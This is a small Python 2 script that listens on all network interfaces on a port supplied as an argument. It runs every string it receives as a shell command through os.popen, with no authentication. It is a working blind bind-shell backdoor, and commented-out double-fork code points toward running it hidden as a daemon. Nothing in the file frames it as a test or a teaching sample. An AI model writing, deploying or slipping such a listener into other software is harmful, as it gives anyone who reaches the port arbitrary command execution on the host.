import socket
import threading 
import os
import time
import sys

def RunCommand(command):
	output = os.popen(command)
	info = output.readlines()
	read = ''
	for line in info: 
		line = line.strip('\r\n')
		read += line	
		read += '\r\n'
	# print read
	return read

	# logfile = open('/home/dream/txt.txt','w+')  
	# oldStdout = sys.stdout  
	# sys.stdout = logfile  
	# os.system(command)
	

def handle_client(client_socket):
	request = client_socket.recv(1024)     #the start port of dynamic port which operating system alllocte orderly
	output = sys.stdout.write(request)
	print "[*] received: %s" % request
	output = RunCommand(request) 
	# client_socket.send(output)
   	client_socket.close()

def server_func(bind_port):
	bind_ip = "0.0.0.0"                           #current host ip
	
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((bind_ip, bind_port))
	server.listen(5)

	print "[*] listening on %s:%d" %(bind_ip, bind_port)

	while True:
		client,addr = server.accept()
		print "[*] Accepted connection from: %s:%d" % (addr[0],addr[1])
		client_handler = threading.Thread(target=handle_client, args = (client,))
		client_handler.start()


def passcreateDaemon():
	# create - fork 1
	# try:
	# 	if os.fork() > 0:
	# 		os._exit(0)
	# except OSError, error:
	# 	print 'fork #1 failed: %d (%s)' % (error.errno, error.strerror)
	# 	os._exit(1)
	# # it separates the son from the father
	# os.chdir('/')
	# os.setsid()
	# os.umask(0)
	# # create - fork 2
	# try:
	# 	pid = os.fork()
	# 	if pid > 0:
	# 		print 'Daemon PID %d' % pid
	# 		os._exit(0)
	# except OSError, error:
	# 	print 'fork #2 failed: %d (%s)' % (error.errno, error.strerror)
	# 	os._exit(1)
	
	bind_port = int(sys.argv[1])
	server_func(bind_port)

passcreateDaemon()

